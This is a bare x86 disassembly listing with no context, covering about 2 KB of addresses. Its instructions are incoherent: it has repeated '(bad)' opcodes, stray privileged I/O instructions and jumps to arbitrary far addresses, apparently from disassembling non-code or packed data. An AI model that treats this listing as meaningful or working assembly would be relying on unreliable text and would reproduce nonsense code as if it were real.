  420294:	rcr    DWORD PTR [edi-0x4a60a38c],cl
  42029a:	push   cs
  42029b:	pop    ds
  42029c:	jo     0x4202fc
  42029e:	data16 into 
  4202a0:	adc    DWORD PTR [ecx-0x29],edi
  4202a3:	jmp    0x80a0bdd7
  4202a8:	lock pop ss
  4202aa:	loopne 0x4202f5
  4202ac:	adc    BYTE PTR [ebx-0x4f65e2c2],0x4e
  4202b3:	mov    ds:0xa1ab737b,eax
  4202b8:	adc    eax,0x8e2e2120
  4202bd:	mov    cl,0x72
  4202bf:	jns    0x4202ce
  4202c1:	mov    bh,0x76
  4202c3:	popf   
  4202c4:	add    BYTE PTR [ebp-0x1bdf29bb],0x6
  4202cb:	inc    ecx
  4202cc:	jl     0x420348
  4202ce:	pusha  
  4202cf:	push   cs
  4202d0:	and    bh,0x61
  4202d3:	rcl    BYTE PTR [ebx+ebx*1],cl
  4202d6:	ja     0x4202f0
  4202d8:	ffree  st(5)
  4202da:	ror    BYTE PTR [eax+0x1f],cl
  4202dd:	nop
  4202de:	(bad)
  4202e1:	mov    DWORD PTR [esi+0x41c2afa1],esp
  4202e7:	adc    esp,DWORD PTR [edx-0x14]
  4202ea:	dec    edx
  4202eb:	out    dx,eax
  4202ec:	xchg   BYTE PTR [edx+0x24566a9a],bh
  4202f2:	les    edi,FWORD PTR [ebp+0x25e2f20]
  4202f8:	das    
  4202f9:	cmp    esp,edx
  4202fb:	jp     0x420365
  4202fd:	mov    al,ds:0x2c9eef24
  420302:	je     0x42032c
  420304:	dec    edi
  420305:	pop    eax
  420306:	repnz inc edi
  420308:	ficomp WORD PTR [esi+0x24c9bdcb]
  42030e:	or     eax,0x6598a61e
  420313:	rol    ebx,0xd5
  420316:	cmp    eax,0x7cfae4fa
  42031b:	aaa    
  42031c:	xor    dh,dl
  42031e:	ss ins DWORD PTR es:[edi],dx
  420320:	loopne 0x420376
  420322:	jnp    0x420385
  420324:	fwait
  420325:	cmp    al,0x44
  420327:	xchg   esp,eax
  420328:	cwde   
  420329:	mov    esi,0xb937bbba
  42032e:	sbb    BYTE PTR [ecx-0x75],bh
  420331:	ja     0x42030a
  420333:	xor    DWORD PTR [ebx],edx
  420335:	xchg   ecx,eax
  420336:	jge    0x4202ea
  420338:	inc    esp
  420339:	jle    0x4202f6
  42033b:	ins    DWORD PTR es:[edi],dx
  42033c:	fs hlt 
  42033e:	loop   0x420306
  420340:	popa   
  420341:	push   cs
  420342:	out    dx,eax
  420343:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420344:	lods   al,BYTE PTR ds:[esi]
  420345:	jb     0x42031d
  420347:	mov    ds,WORD PTR [eax+0x1f46600a]
  42034d:	aas    
  42034e:	jp     0x42037a
  420350:	rol    BYTE PTR [esi+0x79],0xb1
  420354:	test   al,0x55
  420356:	aaa    
  420357:	lods   al,BYTE PTR ss:[esi]
  420359:	pop    ebp
  42035a:	pop    edi
  42035b:	add    al,0x1b
  42035d:	dec    DWORD PTR [ebx+0x43]
  420360:	fwait
  420361:	test   eax,0x9673f30e
  420366:	and    DWORD PTR [esi],edi
  420368:	out    0x62,eax
  42036a:	jmp    0x4f4884a2
  42036f:	and    ch,BYTE PTR [edx-0x6c626ef8]
  420375:	mov    eax,0x2315e68
  42037a:	push   cs
  42037b:	jge    0x4203d3
  42037d:	iret   
  42037e:	das    
  42037f:	gs sbb eax,0x2ccbe2ef
  420385:	sbb    ch,bl
  420387:	sbb    BYTE PTR [edx+0x6a],dl
  42038a:	xlat   BYTE PTR ds:[ebx]
  42038b:	xchg   esi,eax
  42038c:	js     0x420358
  42038e:	fdivr  st(7),st
  420390:	std    
  420391:	cmc    
  420392:	jle    0x42038c
  420394:	enter  0x9443,0x76
  420398:	jb     0x420366
  42039a:	push   edi
  42039b:	or     al,0xe1
  42039d:	jo     0x420363
  42039f:	pop    esi
  4203a0:	pop    ecx
  4203a1:	cwde   
  4203a2:	sbb    ah,ch
  4203a4:	xchg   esp,eax
  4203a5:	dec    eax
  4203a6:	dec    ebp
  4203a7:	push   ss
  4203a8:	mov    WORD PTR [esi+0x6ab3303a],ds
  4203ae:	cmp    BYTE PTR [ebp+0x11],dl
  4203b1:	sub    edi,DWORD PTR [edi+0x23845e15]
  4203b7:	pop    ecx
  4203b8:	xchg   esi,eax
  4203b9:	(bad)  
  4203ba:	sub    DWORD PTR cs:[edi],edi
  4203bd:	cs sbb al,0xc9
  4203c0:	cmp    BYTE PTR [esi+0x995583f],ah
  4203c6:	pop    ds
  4203c7:	push   ss
  4203c8:	mov    al,ds:0x853a11cd
  4203cd:	xchg   ebx,eax
  4203ce:	cs fcmovnu st,st(4)
  4203d1:	mov    ebx,0xfe3d2666
  4203d6:	push   ss
  4203d7:	mov    ebx,0x52102e68
  4203dc:	(bad)  
  4203dd:	fadd   DWORD PTR [eax+0x53]
  4203e0:	jne    0x420444
  4203e2:	cwde   
  4203e3:	in     eax,0xe9
  4203e5:	and    cl,BYTE PTR [ecx+ebp*4]
  4203e8:	fisttp DWORD PTR [edi]
  4203ea:	push   ebx
  4203eb:	or     al,0xfd
  4203ed:	ds pop ebx
  4203ef:	aaa    
  4203f0:	inc    ebx
  4203f1:	push   ds
  4203f2:	sbb    DWORD PTR [ebx-0x3a8ad8c],esp
  4203f8:	popf   
  4203f9:	pop    ss
  4203fa:	and    eax,eax
  4203fc:	lods   eax,DWORD PTR ds:[esi]
  4203fd:	retf   
  4203fe:	mov    ebx,esi
  420400:	outs   dx,BYTE PTR ds:[esi]
  420401:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420402:	jmp    0x812bff80
  420407:	jg     0x42044e
  420409:	xchg   ebp,eax
  42040a:	adc    BYTE PTR [esi+0x18],bh
  42040d:	jb     0x4203ce
  42040f:	loopne 0x420450
  420411:	xchg   BYTE PTR [eax+0x75],ch
  420414:	xor    cl,BYTE PTR [esi-0x70404492]
  42041a:	push   0x84b9d393
  42041f:	mov    bh,0xb9
  420421:	or     eax,0x4da39405
  420426:	inc    ecx
  420427:	adc    ebp,DWORD PTR [eax-0x5d30ca6]
  42042d:	test   dh,0x2f
  420430:	pop    edi
  420431:	jnp    0x42042e
  420433:	mov    ebp,0x83cda34d
  420438:	ss dec esi
  42043a:	test   eax,0x7da518c9
  42043f:	mov    DWORD PTR [ebx-0x72],0xb80861a9
  420446:	aam    0xd6
  420448:	in     al,0xa3
  42044a:	sbb    al,0x79
  42044c:	aam    0xc9
  42044e:	les    esi,FWORD PTR [edi+edx*8]
  420451:	shl    DWORD PTR [ebx],cl
  420453:	push   ebx
  420454:	adc    DWORD PTR [edi],esi
  420456:	stc    
  420457:	outs   dx,BYTE PTR ds:[esi]
  420458:	push   ebp
  420459:	in     eax,0x88
  42045b:	lock popf 
  42045d:	and    edx,DWORD PTR ds:0x31754064
  420463:	adc    al,BYTE PTR [ecx-0x50]
  420466:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420467:	ret    
  420468:	inc    eax
  420469:	xor    ch,dl
  42046b:	aaa    
  42046c:	pop    ds
  42046d:	sbb    ebp,ebp
  42046f:	shr    DWORD PTR ds:0x93932772,0x56
  420476:	daa    
  420477:	adc    DWORD PTR [eax+eax*1],edx
  42047a:	call   FWORD PTR [ebx+ebp*4]
  42047d:	ret    0xd28c
  420480:	inc    edx
  420481:	jg     0x42041f
  420483:	scas   al,BYTE PTR es:[edi]
  420484:	sahf   
  420485:	je     0x42044d
  420487:	mov    bh,0xaa
  420489:	lods   al,BYTE PTR ds:[esi]
  42048a:	xchg   DWORD PTR ds:0x54a08b4,ecx
  420490:	jge    0x420423
  420492:	in     al,dx
  420493:	sub    dl,BYTE PTR [ebx+0x65]
  420496:	cld    
  420497:	repnz sahf 
  420499:	outs   dx,DWORD PTR ds:[esi]
  42049a:	popf   
  42049b:	dec    ebp
  42049c:	sti    
  42049d:	out    0x54,al
  42049f:	xchg   DWORD PTR [ecx],edx
  4204a1:	rol    DWORD PTR [edi+ebp*2-0x2ea4d41c],0xd3
  4204a9:	jl     0x420496
  4204ab:	arpl   WORD PTR [ebx],bx
  4204ad:	sti    
  4204ae:	out    dx,eax
  4204af:	sbb    ebx,DWORD PTR [ebp-0x1148650b]
  4204b5:	lods   eax,DWORD PTR ds:[esi]
  4204b6:	fild   DWORD PTR [ecx]
  4204b8:	sbb    al,0x75
  4204ba:	xor    eax,0xd6366298
  4204bf:	stc    
  4204c0:	leave  
  4204c1:	popf   
  4204c2:	jmp    0xbd21:0xebd2b28b
  4204c9:	sub    ecx,DWORD PTR [ebx+0x2e570c75]
  4204cf:	and    al,0xfc
  4204d1:	jp     0x420524
  4204d3:	mov    ds:0x75c8a8d9,eax
  4204d8:	mov    WORD PTR [edx],gs
  4204da:	jge    0x4204e7
  4204dc:	outs   dx,DWORD PTR ds:[esi]
  4204dd:	xchg   ebp,eax
  4204de:	push   edx
  4204df:	(bad)  
  4204e0:	or     ecx,eax
  4204e2:	rol    BYTE PTR [eax+0x4e533cc9],1
  4204e8:	push   es
  4204e9:	dec    ecx
  4204ea:	mov    BYTE PTR [esi],bh
  4204ec:	add    al,bh
  4204ee:	sub    BYTE PTR [edi-0x6e],dl
  4204f1:	mov    bh,0xbb
  4204f3:	repz pop edx
  4204f5:	ret    0x8756
  4204f8:	ret    0x637f
  4204fb:	add    ch,BYTE PTR ds:0xab7533ea
  420501:	dec    ebp
  420502:	sbb    eax,0x847ddc82
  420507:	inc    esi
  420508:	xor    BYTE PTR [ecx-0x69],0x94
  42050c:	sub    bh,BYTE PTR [ebp-0x4bdcbe69]
  420512:	mov    al,0x51
  420514:	pop    edx
  420515:	push   esp
  420516:	cwde   
  420517:	push   ebp
  420518:	out    dx,eax
  420519:	repnz or BYTE PTR [esi+ebp*8+0x10e7009e],ah
  420521:	and    dl,dh
  420523:	sub    ebp,DWORD PTR ss:[esi]
  420526:	dec    esi
  420527:	and    DWORD PTR [edx+eax*2],esp
  42052a:	or     dh,BYTE PTR [ecx]
  42052c:	push   eax
  42052d:	dec    esi
  42052e:	add    ecx,DWORD PTR [ebx+0x72cac522]
  420534:	and    BYTE PTR [edx],dh
  420536:	cdq    
  420537:	das    
  420538:	jge    0x420510
  42053a:	inc    ebx
  42053b:	pushf  
  42053c:	mov    BYTE PTR [ebx],bl
  42053e:	ret    
  42053f:	mov    edi,0x926f4f3f
  420544:	call   0xaa02:0xa975e38c
  42054b:	jl     0x420512
  42054d:	jle    0x4204d9
  42054f:	push   es
  420550:	push   ds
  420551:	shl    DWORD PTR [eax-0x5268581d],0x8c
  420558:	xor    ch,BYTE PTR [eax+0x50]
  42055b:	std    
  42055c:	xchg   edx,eax
  42055d:	cmps   DWORD PTR es:[esi],DWORD PTR es:[edi]
  42055f:	sar    BYTE PTR [ebx-0x5e],1
  420562:	ret    0xdc39
  420565:	add    eax,0xf7789f6d
  42056a:	test   bh,bh
  42056c:	dec    ebx
  42056d:	(bad)  
  42056e:	(bad)  
  42056f:	inc    ebx
  420570:	mov    esp,DWORD PTR cs:[edi+0x7e]
  420574:	fucomp st(6)
  420576:	mov    dl,0x26
  420578:	sub    esp,DWORD PTR [ecx+esi*2]
  42057b:	stc    
  42057c:	out    0xbe,al
  42057e:	dec    ebx
  42057f:	sub    DWORD PTR [edx+0x64],edx
  420582:	std    
  420583:	loop   0x42052c
  420585:	out    dx,eax
  420586:	dec    eax
  420587:	dec    edx
  420588:	in     al,dx
  420589:	ins    BYTE PTR es:[edi],dx
  42058a:	dec    esp
  42058b:	add    edi,DWORD PTR [ebx]
  42058d:	daa    
  42058e:	bound  esi,QWORD PTR [ecx+0x44]
  420591:	dec    ecx
  420592:	es clc 
  420594:	popf   
  420595:	pop    ds
  420596:	stc    
  420597:	enter  0xcaaf,0xd0
  42059b:	sub    esi,0x797876ef
  4205a1:	dec    ecx
  4205a2:	sbb    ebx,DWORD PTR [ebp+esi*4+0x18a40277]
  4205a9:	push   eax
  4205aa:	cmp    bl,ah
  4205ac:	fwait
  4205ad:	push   es
  4205ae:	xchg   edx,eax
  4205af:	jecxz  0x4205aa
  4205b1:	sub    DWORD PTR [esi-0xaf7de47],ecx
  4205b7:	stos   BYTE PTR es:[edi],al
  4205b8:	xchg   ebp,eax
  4205b9:	mov    ds:0xe1f1f31d,al
  4205be:	out    dx,al
  4205bf:	mov    BYTE PTR [edx+0x174603b5],dh
  4205c5:	jo     0x420617
  4205c7:	aas    
  4205c8:	cmp    BYTE PTR [eax],cl
  4205ca:	mov    ds:0xfbc6bb83,eax
  4205cf:	adc    al,0xa4
  4205d1:	in     al,dx
  4205d2:	cmp    ecx,ecx
  4205d4:	out    dx,eax
  4205d5:	mov    esi,fs
  4205d7:	mov    ds:0x94e17f8b,eax
  4205dc:	out    dx,al
  4205dd:	push   0x3b
  4205df:	pop    ecx
  4205e0:	pop    es
  4205e1:	clc    
  4205e2:	xchg   ecx,eax
  4205e3:	jl     0x420624
  4205e5:	mov    ebx,0xc797e493
  4205ea:	pop    ebx
  4205eb:	std    
  4205ec:	loop   0x4205ee
  4205ee:	sbb    BYTE PTR [ebx],dl
  4205f0:	cwde   
  4205f1:	xor    BYTE PTR [ebx+0x624a78eb],dh
  4205f7:	loop   0x420642
  4205f9:	or     al,0x10
  4205fb:	mov    al,ds:0x442e557d
  420600:	loopne 0x42066d
  420602:	jnp    0x420676
  420604:	mov    eax,ds:0xc818fccc
  420609:	push   esp
  42060a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42060b:	outs   dx,BYTE PTR ds:[esi]
  42060c:	in     eax,0x53
  42060e:	mov    fs,WORD PTR [esi+edx*1]
  420611:	out    0x17,al
  420613:	lock cmp BYTE PTR [esi-0x42],bh
  420617:	imul   ebx,DWORD PTR [ebp-0x74c92950],0xffffff83
  42061e:	xchg   ecx,eax
  42061f:	jmp    0x3470291
  420624:	mov    al,ds:0x5fd62709
  420629:	cmp    ebp,DWORD PTR cs:[ecx]
  42062c:	sub    cl,BYTE PTR [ecx+0x6c]
  42062f:	ret    0x5a20
  420632:	and    al,0xdd
  420634:	pushf  
  420635:	mov    bh,0x94
  420637:	call   0xb56da40a
  42063c:	inc    ebx
  42063d:	push   ebp
  42063e:	or     ecx,esp
  420640:	jbe    0x420669
  420642:	xchg   ebx,eax
  420643:	fsubr  DWORD PTR [edx-0x1d5465d3]
  420649:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42064a:	mov    DWORD PTR [ebp+0x4],edi
  42064d:	int3   
  42064e:	dec    ecx
  42064f:	adc    ebx,ebp
  420651:	je     0x4206cd
  420653:	jne    0x420662
  420655:	mov    ds:0x1037d798,eax
  42065a:	or     al,0x0
  42065c:	mov    al,ds:0x829e2e4c
  420661:	(bad)  
  420662:	mov    eax,0x7ecf1422
  420667:	int3   
  420668:	mul    BYTE PTR [edi-0x5d]
  42066b:	fwait
  42066c:	and    BYTE PTR [edx+0x5b55c560],bl
  420672:	mov    fs,WORD PTR [esi-0x51]
  420675:	je     0x4206d5
  420677:	je     0x4206f6
  420679:	adc    edi,ebp
  42067b:	aam    0x66
  42067d:	xchg   esp,eax
  42067e:	jl     0x420623
  420680:	cdq    
  420681:	pop    ss
  420682:	push   esp
  420683:	push   cs
  420684:	test   DWORD PTR [edx],esi
  420686:	jle    0x42064c
  420688:	pop    esi
  420689:	adc    BYTE PTR [ebx],0x35
  42068c:	pop    eax
  42068d:	test   BYTE PTR [esi-0x4],bl
  420690:	jp     0x4206e2
  420692:	dec    ebx
  420693:	push   esi
  420694:	cmp    BYTE PTR [ebx],cl
  420696:	aaa    
  420697:	lahf   
  420698:	jb     0x4206b9
  42069a:	jnp    0x420630
  42069c:	or     al,0xc
  42069e:	mov    ds:0x13f656d2,al
  4206a4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4206a5:	loope  0x420712
  4206a7:	pushf  
  4206a8:	js     0x4206f6
  4206aa:	unpckhps xmm5,xmm4
  4206ad:	and    DWORD PTR [ebx-0x4db6b8c2],esp
  4206b3:	dec    esi
  4206b4:	ficomp DWORD PTR [eiz*1-0x50ab6c78]
  4206bb:	fwait
  4206bc:	dec    esp
  4206bd:	mov    dl,0x7e
  4206bf:	xor    BYTE PTR [edi+edx*4],bh
  4206c2:	dec    edx
  4206c3:	and    al,0x78
  4206c5:	rol    bh,cl
  4206c7:	sub    ah,BYTE PTR [ebp-0x3424d3c0]
  4206cd:	daa    
  4206ce:	sub    ah,BYTE PTR [ebp+0x8]
  4206d1:	inc    esp
  4206d2:	mov    esp,0xebcc9430
  4206d7:	leave  
  4206d8:	sub    dl,BYTE PTR [edi-0x64]
  4206db:	rcl    BYTE PTR [esi-0x7f],0x92
  4206df:	mov    al,ds:0xb7b1014c
  4206e4:	mov    DWORD PTR [ecx-0x69],ebx
  4206e7:	stos   DWORD PTR es:[edi],eax
  4206e8:	inc    eax
  4206e9:	and    eax,0x6bb7327a
  4206ee:	add    BYTE PTR [ecx-0x34],bl
  4206f1:	or     BYTE PTR [eax],ch
  4206f3:	mov    BYTE PTR [esi+0x9],al
  4206f6:	sbb    cl,BYTE PTR [eax+edx*4+0x50]
  4206fa:	jnp    0x420680
  4206fc:	jno    0x420701
  4206fe:	adc    al,BYTE PTR [edx-0x1725a219]
  420704:	mov    ebx,0xc1d3f60e
  420709:	nop
  42070a:	test   al,0x95
  42070c:	lock push ecx
  42070e:	cmp    bl,BYTE PTR [edx]
  420710:	iret   
  420711:	inc    ebp
  420712:	ja     0x4206e2
  420714:	adc    DWORD PTR [ecx+0x656d96f4],0x98298bd6
  42071e:	inc    BYTE PTR [eax+edi*1]
  420721:	ja     0x42071a
  420723:	adc    eax,DWORD PTR [eax-0xde1147b]
  420729:	or     eax,0xa78e69cb
  42072e:	into   
  42072f:	out    dx,eax
  420730:	in     eax,0xc6
  420732:	push   eax
  420733:	aam    0x4b
  420735:	pop    eax
  420736:	mov    bh,0xdf
  420738:	inc    ebp
  420739:	imul   ebp,eax,0x1de05f2a
  42073f:	xchg   esp,eax
  420740:	into   
  420741:	dec    edx
  420742:	gs add al,0xdd
  420746:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420747:	cli    
  420748:	retf   0x3a8b
  42074b:	xchg   ebp,eax
  42074c:	cmp    DWORD PTR [ebx+0xc18d694],0xffffff80
  420753:	enter  0x41,0x83
  420757:	call   0x5ff910bf
  42075c:	jnp    0x42073d
  42075e:	test   al,0xf7
  420760:	mov    ss,WORD PTR [eax+eax*8-0x1f92de4]
  420767:	(bad)  
  420768:	(bad)  
  420769:	(bad)  
  42076a:	mov    dl,0xff
  42076c:	(bad)  
  42076d:	aaa    
  42076e:	sub    cl,BYTE PTR [edi-0x4a]
  420771:	cmc    
  420772:	xchg   BYTE PTR [ebp+0x49],dl
  420775:	jbe    0x420771
  420777:	int3   
  420778:	clc    
  420779:	and    esi,esp
  42077b:	cvttps2pi mm0,QWORD PTR [edx]
  42077e:	mov    eax,ds:0xc5bb0a9a
  420783:	mov    al,ds:0x2654bedf
  420788:	aam    0x83
  42078a:	pop    eax
  42078b:	mov    dh,al
  42078d:	mov    esp,0xf87f233a
  420792:	ss xchg ecx,eax
  420794:	and    bl,BYTE PTR [edx-0x54765674]
  42079a:	lahf   
  42079b:	lods   eax,DWORD PTR ds:[esi]
  42079c:	lds    edi,FWORD PTR [ecx+ebp*8-0x3bad80bc]
  4207a3:	(bad)  
  4207a4:	js     0x420789
  4207a6:	data16 icebp 
  4207a8:	mov    esp,0x4f797116
  4207ad:	fucom  st(3)
  4207af:	sub    cl,BYTE PTR [edx-0x75a682f]
  4207b5:	mov    ecx,0xb772a858
  4207ba:	mov    ebx,0x526b10b0
  4207bf:	or     ecx,DWORD PTR [ebp+0x9b8662b]
  4207c5:	xchg   edi,eax
  4207c6:	mov    al,0xb1
  4207c8:	push   edi
  4207c9:	adc    dl,BYTE PTR [edx+0x20]
  4207cc:	mul    DWORD PTR [eax+0x1e]
  4207cf:	xchg   esp,eax
  4207d0:	(bad)  
  4207d1:	jne    0x4207dc
  4207d3:	add    edi,ebx
  4207d5:	xchg   esp,eax
  4207d6:	daa    
  4207d7:	in     eax,dx
  4207d8:	adc    BYTE PTR [edi+0x2535638c],0x61
  4207df:	cdq    
  4207e0:	es stos BYTE PTR es:[edi],al
  4207e2:	sub    eax,eax
  4207e4:	fild   QWORD PTR [esi]
  4207e6:	or     DWORD PTR [edx-0x290ca8a6],esp
  4207ec:	sbb    ebx,ebx
  4207ee:	in     eax,dx
  4207ef:	adc    eax,0xc2ae9349
  4207f4:	mov    dh,BYTE PTR [edx+0x5d]
  4207f7:	push   0x48597307
  4207fc:	adc    DWORD PTR [ebp-0x4b],ebx
  4207ff:	pop    esi
  420800:	ins    BYTE PTR es:[edi],dx
  420801:	es xchg ebp,eax
  420803:	(bad)  
  420804:	gs das 
  420806:	pop    esp
  420807:	or     bl,BYTE PTR [eax]
  420809:	push   ss
  42080a:	xchg   bl,ch
  42080c:	fsubp  st(5),st
  42080e:	(bad)  
  42080f:	pop    ebp
  420810:	mov    dh,0xaf
  420812:	push   edx
  420813:	mov    ecx,0xc0abe9f
  420818:	xchg   dx,ax
  42081a:	lods   al,BYTE PTR ds:[esi]
  42081b:	cmp    al,0x7
  42081d:	inc    ebp
  42081e:	xor    al,0xc8
  420820:	retf   0x8f8f
  420823:	and    DWORD PTR [ebx+0xdce1ad3],ebp
  420829:	dec    BYTE PTR [edi+edx*2+0x1e]
  42082d:	aad    0x7d
  42082f:	adc    al,0x9f
  420831:	ins    DWORD PTR es:[edi],dx
  420832:	xchg   ebp,eax
  420833:	nop
  420834:	sub    edi,DWORD PTR [edi+ebx*4-0x5d]
  420838:	pop    edi
  420839:	pop    ecx
  42083a:	rcl    BYTE PTR [ebx],0x33
  42083d:	dec    esp
  42083e:	jecxz  0x420823
  420840:	and    ecx,DWORD PTR [esi]
  420842:	or     cl,BYTE PTR [edi-0x25]
  420845:	ret    
  420846:	in     al,dx
  420847:	int    0x91
  420849:	movaps xmm3,xmm7
  42084c:	fcom   DWORD PTR ds:0x35bde87
  420852:	pop    eax
  420853:	aaa    
  420854:	(bad)  
  420855:	imul   ebp,DWORD PTR [ecx],0xffffffd6
  420858:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420859:	bnd jns 0x42085e
  42085c:	and    ecx,DWORD PTR [eax+0x31ac9cda]
  420862:	into   
  420863:	push   0x53
  420865:	sub    DWORD PTR [esi-0x4c6bfdbf],edi
  42086b:	xor    ebx,edi
  42086d:	sbb    eax,0x496db29d
  420872:	pop    edx
  420873:	scas   eax,DWORD PTR es:[edi]
  420874:	fdiv   QWORD PTR [ebp-0x73bd75a7]
  42087a:	add    cl,BYTE PTR [edx-0x6b]
  42087d:	mov    ah,0x9
  42087f:	inc    eax
  420880:	jnp    0x420843
  420882:	ins    BYTE PTR es:[edi],dx
  420883:	pop    eax
  420884:	stos   DWORD PTR es:[edi],eax
  420885:	push   ds
  420886:	push   ebp
  420887:	test   bh,ch
  420889:	ror    bl,0x9
  42088c:	adc    bl,BYTE PTR [ebx+0x39]
  42088f:	inc    ebx
  420890:	ret    
  420891:	jae    0x4208d2
  420893:	test   ebp,ecx
  420895:	outs   dx,BYTE PTR ds:[esi]
  420896:	ins    DWORD PTR es:[edi],dx
  420897:	(bad)  
  420898:	outs   dx,DWORD PTR ds:[esi]
  420899:	cmp    eax,0x45e51f0c
  42089e:	icebp  
  42089f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4208a0:	inc    edi
  4208a1:	push   0xffffffec
  4208a3:	test   eax,0x5a4723dc
  4208a8:	cmp    ebp,DWORD PTR [edx+0x7754844d]
  4208ae:	leave  
  4208af:	push   0xe3fc1b9d
  4208b4:	sbb    cl,cl
  4208b6:	loop   0x420899
  4208b8:	sub    al,0x3c
  4208ba:	and    dh,ch
  4208bc:	in     eax,0x6b
  4208be:	popf   
  4208bf:	cmp    esi,DWORD PTR fs:[esp+ebp*1-0x73bbe249]
  4208c7:	shl    DWORD PTR [eax+0x574cc3e7],1
  4208cd:	leave  
  4208ce:	push   es
  4208cf:	cli    
  4208d0:	mov    ebp,0x5d66c710
  4208d5:	les    ecx,FWORD PTR [esi+esi*2]
  4208d8:	jge    0x420948
  4208da:	jl     0x4208db
  4208dc:	das    
  4208dd:	mov    eax,ds:0xee7639b7
  4208e2:	int3   
  4208e3:	or     eax,0x467faac2
  4208e8:	jmp    0xc3e8:0x997038f0
  4208ef:	xor    bl,BYTE PTR [ebp-0xdb79877]
  4208f5:	gs gs push 0xffffffe4
  4208f9:	repz adc al,0xcc
  4208fc:	outs   dx,BYTE PTR ds:[esi]
  4208fd:	imul   esp,DWORD PTR [esi+0x7bf235b4],0xffffffe5
  420904:	jnp    0x4208dc
  420906:	jmp    0x704e:0xad8854dc
  42090d:	inc    ebp
  42090e:	lahf   
  42090f:	sahf   
  420910:	fiadd  WORD PTR [edx]
  420912:	cs inc esp
  420914:	stos   DWORD PTR es:[edi],eax
  420915:	cdq    
  420916:	dec    eax
  420917:	scas   al,BYTE PTR es:[edi]
  420918:	and    ebp,DWORD PTR [ebx]
  42091a:	pop    es
  42091b:	iret   
  42091c:	jmp    DWORD PTR [ecx-0xa49a7bd]
  420922:	push   ebp
  420923:	loopne 0x4208d6
  420925:	dec    edx
  420926:	imul   edx,DWORD PTR [ebp+0x15],0x6
  42092a:	cwde   
  42092b:	out    dx,eax
  42092c:	xchg   ebp,eax
  42092d:	add    BYTE PTR [edi],ah
  42092f:	xor    BYTE PTR [edi],ah
  420931:	xchg   ebp,eax
  420932:	loopne 0x420975
  420934:	test   BYTE PTR [ebx-0x23a0d1be],al
  42093a:	cmp    esi,edx
  42093c:	dec    ebx
  42093d:	or     BYTE PTR [esi],ah
  42093f:	fidiv  DWORD PTR [eax]
  420941:	sbb    al,0x7c
  420943:	jmp    0x42090c
  420945:	call   0x2d3e:0xc6b0f1f7
  42094c:	xchg   ecx,eax
  42094d:	sub    ebx,0xffffff95
  420950:	packsswb mm5,QWORD PTR [ecx+ebp*8-0x26aee42]
  420958:	(bad)  
  420959:	xchg   esi,eax
  42095a:	xor    DWORD PTR [eax],ecx
  42095c:	inc    edx
  42095d:	mov    BYTE PTR [eax-0x5d],cl
  420960:	dec    ebp
  420961:	(bad)  
  420963:	fdivr  st(5),st
  420965:	sub    esp,DWORD PTR [edx-0x4c]
  420968:	mov    DWORD PTR [ebp-0x3],ecx
  42096b:	push   0xbefa87b9
  420970:	mov    esi,0xe5c4df7f
  420975:	mov    eax,ds:0x54fc5256
  42097a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42097b:	xor    BYTE PTR [ebx-0x3],0x25
  42097f:	in     eax,0x30
  420981:	gs (bad) 
  420984:	inc    edi
  420985:	mov    ecx,0x5043215d
  42098a:	in     al,dx
  42098b:	int    0x7
  42098d:	push   0x1c
  42098f:	dec    ecx
  420990:	dec    esp
  420991:	lods   eax,DWORD PTR ds:[esi]
  420992:	out    0xa7,eax
  420994:	push   cs
  420995:	adc    dl,dl
  420997:	pop    esp
  420998:	cmp    eax,0x24a06e5c
  42099d:	sub    esp,DWORD PTR [esi-0x79b24cc2]
  4209a3:	pop    esi
  4209a4:	mov    bh,0x58
  4209a6:	ror    ecx,cl
  4209a8:	cmp    dl,BYTE PTR [ebp-0x4a2f59c9]
  4209ae:	pushf  
  4209af:	sub    ebx,ebp
  4209b1:	cmp    ebx,DWORD PTR [ebx-0x7]
  4209b4:	shl    DWORD PTR [edx-0x1],cl
  4209b7:	out    dx,eax
  4209b8:	lahf   
  4209b9:	loop   0x42096a
  4209bb:	fnstenv [edi]
  4209bd:	es test al,0x50
  4209c0:	or     bh,BYTE PTR [eax]
  4209c2:	or     BYTE PTR [ecx+0x44],al
  4209c5:	sbb    dh,BYTE PTR [eax+0x13f95db7]
  4209cb:	pop    ecx
  4209cc:	dec    edx
  4209cd:	xlat   BYTE PTR ds:[ebx]
  4209ce:	mov    BYTE PTR [edx],cl
  4209d0:	adc    BYTE PTR [ecx-0xa865a4d],cl
  4209d6:	mul    BYTE PTR [esi-0x69efca4]
  4209dc:	jnp    0x420a39
  4209de:	faddp  st(3),st
  4209e0:	(bad)  
  4209e1:	jne    0x4209c1
  4209e3:	xor    eax,0x5c722eb6
  4209e8:	pop    ebp
  4209e9:	outs   dx,BYTE PTR ds:[esi]
  4209ea:	xchg   ebp,eax
  4209eb:	adc    eax,0x8da806af
  4209f0:	xor    BYTE PTR [edi+0x51],dl
  4209f3:	ins    DWORD PTR es:[edi],dx
  4209f4:	sti    
  4209f5:	pop    eax
  4209f6:	int3   
  4209f7:	shl    esi,0x3c
  4209fa:	mov    cl,0xf8
  4209fc:	repnz fcmovnu st,st(4)
  4209ff:	hlt    
  420a00:	dec    ebx
  420a01:	test   DWORD PTR [eax],0xa034b40b
  420a07:	xchg   DWORD PTR [ebp+0x25],esp
  420a0a:	ss push 0x2eb0e3d9
  420a10:	mov    ds:0xa9b885e4,eax
  420a15:	adc    ebx,ecx
  420a17:	cmp    al,BYTE PTR [ecx-0x9811a05]
  420a1d:	lea    esp,[ebp+0x6b]
  420a20:	add    DWORD PTR [edx],ebp
  420a22:	call   0x5ae1:0x59a20505
  420a29:	mov    esi,0xba907a59
  420a2e:	loopne 0x420a15
  420a30:	jmp    0xf8b4bc3a
  420a35:	out    0x2,al
  420a37:	fs inc edi
  420a39:	cmp    ah,dh
  420a3b:	mov    ecx,edi
  420a3d:	test   al,0x53
  420a3f:	js     0x4209e7
  420a41:	(bad)  
  420a42:	cli    
  420a43:	les    edx,FWORD PTR [esi+0x3a]
  420a46:	ror    BYTE PTR [ebx+0x18],1
  420a49:	lea    edi,[esp-0x592c0859]
